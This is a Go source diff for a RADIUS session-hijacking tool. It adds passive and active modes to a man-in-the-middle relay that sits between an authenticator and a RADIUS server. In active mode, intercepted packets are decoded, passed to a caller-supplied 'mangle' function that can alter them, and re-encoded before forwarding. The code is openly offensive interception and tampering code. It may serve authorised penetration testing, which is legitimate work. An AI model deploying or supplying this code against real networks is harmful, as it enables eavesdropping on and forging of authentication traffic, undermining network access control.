@@ -4,12 +4,19 @@ import (
 	"encoding/hex"
 	"fmt"
 	"net"
-	"radius/packet"
+	"radius/radiuspacket"
 	"radius/utils"
 	"strconv"
 )
 
-type FilterFunc func(packet packet.RadiusPacket) (bool, packet.RadiusPacket)
+type Mode uint
+
+const (
+	Passive Mode = 0
+	Active  Mode = 1
+)
+
+type MangleFunc func(packet *radiuspacket.RadiusPacket, from net.UDPAddr, to net.UDPAddr) bool
 
 //Session between host and guest to be hijacked.
 //The attacker must be placed between the authenticator and the authenticator server.
@@ -17,6 +24,7 @@ type FilterFunc func(packet packet.RadiusPacket) (bool, packet.RadiusPacket)
 type Session struct {
 	hostName string //Target RADIUS server
 	ports    []int  //Target ports
+	mode     Mode
 }
 
 type udpData struct {
@@ -34,7 +42,7 @@ type clientData struct {
 const protocol = "udp"
 
 //Receives UDP packets and writes the result in a channel for asyncronous management of the packets
-func (session *Session) receiveUDPPacket(conn *net.UDPConn, dstPort int, channel chan udpData) {
+func receiveUDPPacket(conn *net.UDPConn, dstPort int, channel chan udpData) {
 
 	buff := make([]byte, 2048)
 
@@ -61,7 +69,7 @@ func (session *Session) receiveUDPPacket(conn *net.UDPConn, dstPort int, channel
 
 }
 
-func (session *Session) setupUDPServer(port int) *net.UDPConn {
+func setupUDPServer(port int) *net.UDPConn {
 
 	addrToListen := ":" + strconv.FormatUint(uint64(port), 10)
 
@@ -84,8 +92,19 @@ func (session *Session) setupUDPServer(port int) *net.UDPConn {
 
 }
 
+func (session *Session) Init(mode Mode, hostName string, ports ...int) {
+
+	session.mode = mode
+	session.hostName = hostName
+
+	session.ports = make([]int, len(ports))
+
+	copy(session.ports, ports)
+
+}
+
 //HijackSession In order to spy the communications between authenticator and authenticator server
-func (session *Session) HijackSession(filterFunc FilterFunc) {
+func (session *Session) Hijack(mangleFunc MangleFunc) {
 
 	var clients []clientData
 
@@ -94,9 +113,9 @@ func (session *Session) HijackSession(filterFunc FilterFunc) {
 
 	for _, port := range session.ports {
 
-		serverConn := session.setupUDPServer(port)
+		serverConn := setupUDPServer(port)
 		serverConnections[port] = serverConn
-		go session.receiveUDPPacket(serverConn, port, udpChan) //Start receiving packets from client towards the RADIUS server
+		go receiveUDPPacket(serverConn, port, udpChan) //Start receiving packets from client towards the RADIUS server
 
 	}
 
@@ -126,7 +145,31 @@ func (session *Session) HijackSession(filterFunc FilterFunc) {
 			for _, client := range clients {
 				if client.mappedPort == data.dstPort {
 					fmt.Println("Send to client", client.clientAddr)
-					serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr) //Redirect to client
+
+					if session.mode == Active {
+
+						packet := radiuspacket.NewRadiusPacket()
+
+						packet.Decode(data.buff)
+
+						forward := mangleFunc(packet, data.senderAddr, client.clientAddr)
+
+						if forward {
+
+							if encoded, raw := packet.Encode(); encoded {
+								fmt.Println("Forwarded... ")
+								//Redirect our custom mangled packet to the client
+								serverConnections[data.senderAddr.Port].WriteToUDP(raw, &client.clientAddr)
+							}
+
+						}
+
+					} else {
+						//Redirect to client without any treatment
+						serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr)
+
+					}
+
 					break
 				}
 			}
@@ -197,20 +240,32 @@ func (session *Session) HijackSession(filterFunc FilterFunc) {
 
 				clients = append(clients, client)
 
-				go session.receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server
+				go receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server
 
 			}
 
 			fmt.Println("Sending to Radius Server...", client.connection.RemoteAddr().String())
 
-			var incomingPacket packet.RadiusPacket
+			if session.mode == Active {
 
-			incomingPacket.Decode(data.buff)
+				packet := radiuspacket.NewRadiusPacket()
 
-			filterPassed, filterPacket := filterFunc(incomingPacket)
+				packet.Decode(data.buff)
 
-			if filterPassed {
-				client.connection.Write(filterPacket.Encode()) //Redirect to server
+				forward := mangleFunc(packet, client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)))
+
+				if forward {
+
+					if encoded, raw := packet.Encode(); encoded {
+						fmt.Println("Forwarded... ")
+						client.connection.Write(raw) //Redirect mangled packet to server
+					}
+
+				}
+
+			} else {
+				//Redirect raw data without any treatment
+				client.connection.Write(data.buff)
 			}
 
 		}
